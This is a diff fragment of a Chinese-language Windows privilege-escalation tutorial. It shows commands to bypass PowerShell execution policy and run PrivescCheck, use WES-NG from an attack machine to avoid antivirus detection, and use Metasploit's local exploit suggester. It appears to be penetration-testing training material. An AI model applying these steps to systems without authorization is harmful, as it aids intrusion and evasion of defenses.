+提醒：若要在目标系统中运行 PrivescCheck，你可能需要绕过执行策略限制。你可以使用如下所示的Set-ExecutionPolicy 命令行工具来完成该操作。
+
+```
+PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
+PS C:\> . .\PrivescCheck.ps1
+PS C:\> Invoke-PrivescCheck
+```
+
+#### WES-NG
+
+Windows Exploit Suggester - Next Generation
+
+部分漏洞探测脚本（例如 winPEAS）需要你将其上传至目标设备并在设备内运行，此举有可能被杀毒软件检测并清除。为避免产生容易引人察觉的多余操作痕迹，你可以选择使用 WES-NG 工具，该工具可直接在攻击机上运行。
+
+WES-NG 是一款 Python 脚本，下载地址：https://github.com/bitsadmin/wesng
+
+完成安装后，在正式使用前，请输入命令 wes.py --update 更新漏洞数据库。该脚本会依托自身生成的数据库，检索目标设备缺失的系统补丁，找出可用于在目标设备上提升权限的相关漏洞。
+
+使用该脚本前，你需要先在目标设备中执行 systeminfo 命令，切记要将命令输出内容保存为文本文档，再将该文件传输至你的攻击机中。
+
+完成上述操作后，即可按照下述方式运行 wes.py 脚本；
+
+```
+user@kali$ wes.py systeminfo.txt
+```
+
+#### Metasploit
+
+如果你已经在目标系统中获取了meterpreter会话，可使用 multi/recon/local_exploit_suggester 模块扫描目标系统存在的漏洞，借此提升在目标系统中的操作权限。
+
